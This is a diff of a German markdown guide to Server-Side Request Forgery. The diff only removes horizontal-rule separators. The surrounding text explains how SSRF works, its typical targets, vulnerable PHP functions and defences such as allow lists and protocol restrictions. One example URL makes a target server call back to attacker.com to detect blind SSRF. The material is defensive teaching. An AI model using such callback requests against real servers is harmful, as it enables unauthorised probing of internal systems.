@@ -19,7 +19,7 @@
 - [Tools & Testing](#tools--testing)
 - [Weitere Links](#weitere-links)
 
-----
+
 
 ## Definition
 
@@ -30,7 +30,7 @@ Dabei wird ein Server dazu gebracht, unerwünschte oder manipulierte Requests an
 
 **Beispiel im Alltag:** Viele Web-Apps erzeugen Vorschaubilder für URLs (z. B. Messenger, Blogs). Der Server lädt dazu die Inhalte der URL herunter. Wird diese Funktion missbraucht, kann der Angreifer beliebige Ziele abrufen lassen.
 
----
+
 
 ## Funktionsweise eines SSRF-Angriffs
 
@@ -39,7 +39,7 @@ Dabei wird ein Server dazu gebracht, unerwünschte oder manipulierte Requests an
 3. Server verarbeitet die schadhafte Eingabe des Users und erstellt eine Anfrage an die Ziel-URL.
 4. Bei erfolgreicher Verarbeitung stehen dem Angreifen nun die Funktionen und Daten des Serers zur Verfügung.
 
----
+
 
 ## Typische Angriffsziele
 
@@ -49,7 +49,7 @@ Dabei wird ein Server dazu gebracht, unerwünschte oder manipulierte Requests an
 - **Admin-Panels**, die nur intern erreichbar sind
 - **SSRF to RCE:** Manche Dienste akzeptieren SSRF-Requests und führen z. B. Befehle aus
 
----
+
 
 <div align="right">
 
@@ -78,7 +78,7 @@ http://example.com/fetch?url=http://attacker.com/callback
 ### 3. Semi-Blind SSRF
 - Teilweise sichtbare Informationen (z. B. HTTP-Statuscode oder Fehlerausgabe), aber nicht der gesamte Response.
 
----
+
 
 ## Typische Funktionen, die SSRF ermöglichen
 Viele Programmiersprachen und Frameworks akzeptieren URLs als Eingabeparameter:
@@ -91,7 +91,7 @@ fopen($url, "r");          // öffnet auch Remote-Dateien
 curl_exec($ch);            // klassische HTTP-Anfragen
 ```
 
----
+
 
 ## Gefahren & Auswirkungen
 
@@ -102,7 +102,7 @@ curl_exec($ch);            // klassische HTTP-Anfragen
 - Eskalation zu Remote Code Execution (RCE) in Kombination mit schwachen Services
 
 
----
+
 
 ## Schutzmaßnahmen
 - **Allow-List** statt Deny-List: Nur explizit erlaubte Hosts zulassen.
@@ -113,7 +113,7 @@ curl_exec($ch);            // klassische HTTP-Anfragen
 - **Nur nötige Protokolle** erlauben (kein `file://`, `ftp://`, `gopher://` usw.).
 - **Web Application Firewalls** (WAFs) oder Bibliotheken wie `SafeCurl`, `NoPrivateNetworkHttpClient` einsetzen.
 
-----
+
 
 <div align="right">
 
@@ -182,14 +182,14 @@ if (!$isDenied) {file_get_contents($input);}
 - [SafeCurl](https://github.com/vanilla/safecurl)
 - Eigener DNS-Logger (z. B. dnslog.cn, interactsh) für Blind-SSRF
 
----
+
 
 ## Weitere Links
 - [Media.ccc.de - SSRF](https://media.ccc.de/v/dgwk2024-56206-einfuhrung-in-ssrf-moglic#t=1431) (Video)
 - [F5 - Was ist SSRF?](https://www.f5.com/de_de/glossary/ssrf)
 
 
----
+
 
 ## Haftungsausschluss
 
